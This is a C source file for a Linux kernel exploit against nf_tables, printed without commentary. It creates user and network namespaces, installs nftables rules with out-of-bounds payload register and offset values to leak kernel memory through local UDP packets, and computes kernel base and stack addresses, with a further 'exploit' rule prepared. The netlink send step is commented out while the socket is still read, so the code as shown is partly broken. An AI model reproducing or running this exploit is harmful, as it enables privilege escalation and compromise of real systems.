#define _GNU_SOURCE

#include <stdio.h>
#include <sched.h>
#include <unistd.h>
#include <stdarg.h>
#include <linux/sched.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <netinet/in.h>
#include <stddef.h>    /* for offsetof */
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>

#include <pthread.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

char pkt_message[512] = {0, };
char pkt_buffer[512] = {0, };
int pkt_port = 0;

void hexdump(const void* data, size_t size) {
    unsigned char *p = (unsigned char*)data;
    for (size_t i = 0; i < size; i++) {
        printf("%02X ", p[i]);
        if ((i + 1) % 16 == 0 || i == size - 1) {
            printf("\n");
        }
    }
}

void *sender_thread(void *arg) {
    int client_socket;
    struct sockaddr_in server_addr;
    
    // Create a UDP socket
    if ((client_socket = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("socket");
        exit(1);
    }
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(pkt_port);
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    
    // Send the UDP packet
    sendto(client_socket, pkt_message, 512, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    
    close(client_socket);
    return NULL;
}

void *receiver_thread(void *arg) {
    int server_socket;
    struct sockaddr_in server_addr, client_addr;
    
    // Create a UDP socket
    if ((server_socket = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("socket");
        exit(1);
    }
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(pkt_port);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    
    // Bind the socket to the server address
    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("bind");
        exit(1);
    }
    
    socklen_t client_addr_len = sizeof(client_addr);
    
    // Receive the UDP packet
    recvfrom(server_socket, pkt_buffer, 512, 0, (struct sockaddr *)&client_addr, &client_addr_len);
    
    close(server_socket);
    return NULL;
}

void write_to_file(const char *which, const char *format, ...) {
  FILE * fu = fopen(which, "w");
  va_list args;
  va_start(args, format);
  if (vfprintf(fu, format, args) < 0) {
    perror("cannot write");
    exit(1);
  }
  fclose(fu);
}

void init_cpu(void){
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
        perror("[-] sched_setaffinity");
        exit(EXIT_FAILURE);    
    }
}

void init_namespace(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();    

  if (unshare(CLONE_NEWUSER) < 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    exit(EXIT_FAILURE);    
  }
  if (unshare(CLONE_NEWNET) < 0) {
    perror("[-] unshare(CLONE_NEWNET)");
    exit(EXIT_FAILURE);    
  }

  write_to_file("/proc/self/uid_map", "0 %d 1", uid);
  write_to_file("/proc/self/setgroups", "deny");
  write_to_file("/proc/self/gid_map", "0 %d 1", gid);

}

void begin_batch(struct mnl_nlmsg_batch *b, int *seq)
{
    nftnl_batch_begin(mnl_nlmsg_batch_current(b), (*seq)++);
    mnl_nlmsg_batch_next(b);
}

void end_batch(struct mnl_nlmsg_batch *b, int *seq)
{
    nftnl_batch_end(mnl_nlmsg_batch_current(b), (*seq)++);
    mnl_nlmsg_batch_next(b);
}

void add_table(struct mnl_nlmsg_batch *b, int *seq, const char* table_name)
{
    struct nftnl_table *t;
    t = nftnl_table_alloc();

    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, NFPROTO_IPV4);
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name);

    struct nlmsghdr *nlh;
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(b),
                                NFT_MSG_NEWTABLE, NFPROTO_IPV4,
                                NLM_F_CREATE | NLM_F_ACK, (*seq)++);
    nftnl_table_nlmsg_build_payload(nlh, t);
    nftnl_table_free(t);

    mnl_nlmsg_batch_next(b);
}

void add_chain(struct mnl_nlmsg_batch *b, int *seq, const char* table_name, const char* chain_name)
{
    struct nftnl_chain *t;
    t = nftnl_chain_alloc();

    nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);

    nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, NF_INET_LOCAL_IN);
    nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0);

    struct nlmsghdr *nlh;
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(b),
                                NFT_MSG_NEWCHAIN, NFPROTO_IPV4,
                                NLM_F_CREATE | NLM_F_ACK, (*seq)++);
    nftnl_chain_nlmsg_build_payload(nlh, t);
    nftnl_chain_free(t);

    mnl_nlmsg_batch_next(b);
}

static void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t dreg,
            uint32_t offset, uint32_t len)
{
    struct nftnl_expr *e;

    e = nftnl_expr_alloc("payload");
    if (e == NULL) {
        perror("expr payload oom");
        exit(EXIT_FAILURE);
    }

    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);

    nftnl_rule_add_expr(r, e);
}

static void add_set_payload(struct nftnl_rule *r, uint32_t base, uint32_t sreg,
            uint32_t offset, uint32_t len)
{
    struct nftnl_expr *e;

    e = nftnl_expr_alloc("payload");
    if (e == NULL) {
        perror("expr payload oom");
        exit(EXIT_FAILURE);
    }

    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_SREG, sreg);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);

    nftnl_rule_add_expr(r, e);
}

static void add_cmp(struct nftnl_rule *r, uint32_t sreg, uint32_t op,
            const void *data, uint32_t data_len)
{
    struct nftnl_expr *e;

    e = nftnl_expr_alloc("cmp");
    if (e == NULL) {
        perror("expr cmp oom");
        exit(EXIT_FAILURE);
    }

    nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_SREG, sreg);
    nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_OP, op);
    nftnl_expr_set(e, NFTNL_EXPR_CMP_DATA, data, data_len);

    nftnl_rule_add_expr(r, e);
}

void add_rule_leak(struct mnl_nlmsg_batch *b, int *seq, const char* table_name, const char* chain_name)
{
    struct nftnl_rule *r = NULL;
    uint8_t proto;
    uint16_t dport;
    uint64_t handle_num;

    r = nftnl_rule_alloc();
    if (r == NULL) {
        perror("OOM");
        exit(EXIT_FAILURE);
    }

    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, NFPROTO_IPV4);

    proto = IPPROTO_UDP;
    add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1,
            offsetof(struct iphdr, protocol), sizeof(uint8_t));
    add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &proto, sizeof(uint8_t));

    dport = htons(1234);
    add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG_1,
            offsetof(struct tcphdr, dest), sizeof(uint16_t));
    add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &dport, sizeof(uint16_t));

    add_set_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0xfffffffc,0x20,0x30);

    struct nlmsghdr *nlh;
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(b),
                    NFT_MSG_NEWRULE,
                    nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY),
                    NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
                    (*seq)++);
    nftnl_rule_nlmsg_build_payload(nlh, r);
    nftnl_rule_free(r);

    mnl_nlmsg_batch_next(b);
}

void add_rule_exploit(struct mnl_nlmsg_batch *b, int *seq, const char* table_name, const char* chain_name)
{
    struct nftnl_rule *r = NULL;
    uint8_t proto;
    uint16_t dport;
    uint64_t handle_num;

    r = nftnl_rule_alloc();
    if (r == NULL) {
        perror("OOM");
        exit(EXIT_FAILURE);
    }

    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, NFPROTO_IPV4);

    proto = IPPROTO_UDP;
    add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1,
            offsetof(struct iphdr, protocol), sizeof(uint8_t));
    add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &proto, sizeof(uint8_t));

    dport = htons(8080);
    add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, NFT_REG_1,
            offsetof(struct tcphdr, dest), sizeof(uint16_t));
    add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &dport, sizeof(uint16_t));

    add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0xffffffd0,0x8,0xf0);

    struct nlmsghdr *nlh;
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(b),
                    NFT_MSG_NEWRULE,
                    nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY),
                    NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
                    (*seq)++);
    nftnl_rule_nlmsg_build_payload(nlh, r);
    nftnl_rule_free(r);

    mnl_nlmsg_batch_next(b);
}

int main(int argc, char *argv[])
{
    printf("[+] exploit process starting\n");

    init_cpu();
    init_namespace();

    struct mnl_socket *nl;
    char buf[MNL_SOCKET_BUFFER_SIZE];
    uint32_t portid, seq;
    struct nftnl_table *t;
    struct mnl_nlmsg_batch *batch;
    int ret, n;
    int check = 0;

    seq = 100;
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    // HERE
    begin_batch(batch, &seq);

    add_table(batch, &seq, "exploit_table");
    check++;

    add_chain(batch, &seq, "exploit_table", "leak_chain");
    check++;

    add_rule_leak(batch, &seq, "exploit_table", "leak_chain");
    check++;

    add_chain(batch, &seq, "exploit_table", "exploit_chain");
    check++;

    add_rule_exploit(batch, &seq, "exploit_table", "exploit_chain");
    check++;

    end_batch(batch, &seq);
    //
    /*
    nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL)
    {
        perror("mnl_socket_open");
        exit(EXIT_FAILURE);
    }

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
    {
        perror("mnl_socket_bind");
        exit(EXIT_FAILURE);
    }
    portid = mnl_socket_get_portid(nl);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("mnl_socket_send");
        exit(EXIT_FAILURE);
    }
    */
    mnl_nlmsg_batch_stop(batch);

    n = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    while (n > 0)
    {
        const struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        int len = n;
        
        while (mnl_nlmsg_ok(nlh, len))
        {
            struct nlmsgerr *res;
            res = mnl_nlmsg_get_payload(nlh);
            printf("[+] netlink result %d: %d\n", nlh->nlmsg_seq, res->error);
            nlh = mnl_nlmsg_next(nlh, &len);
            check--;
        }

        if(check == 0) break;
        n = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    }

    mnl_socket_close(nl);
    printf("[+] create nft_tables to leak\n");

    system("ip addr add 127.0.0.1/8 dev lo");
    system("ip link set lo up");

    pthread_t leak_sender, leak_receiver;
    printf("[+] leak_sender -> leak_receiver (udp)\n");
    pkt_port = 1234;
    memset(pkt_message, 'a', 512);
    pthread_create(&leak_sender, NULL, sender_thread, NULL);
    pthread_create(&leak_receiver, NULL, receiver_thread, NULL);

    pthread_join(leak_sender, NULL);
    pthread_join(leak_receiver, NULL);

    unsigned long leak = 0;

    memcpy((char*)&leak,pkt_buffer+0x38,8);
    unsigned long kernel_stack = leak - 0x1bfb48;
    printf("0x%lx\n", leak);
    memcpy((char*)&leak,pkt_buffer+0x40,8);
    printf("0x%lx\n", leak);
    unsigned long kernel_base = leak - 0x6744e;
    //hexdump(pkt_buffer, 48);
    leak = leak & 0xffffffffff000000;
    kernel_stack = kernel_stack & 0xffffff0000000000;
    kernel_base = leak;
    printf("[+] kernel_base = 0x%lx\n", kernel_base);
    printf("[+] kernel_stack = 0x%lx\n", kernel_stack);

    return EXIT_SUCCESS;
}
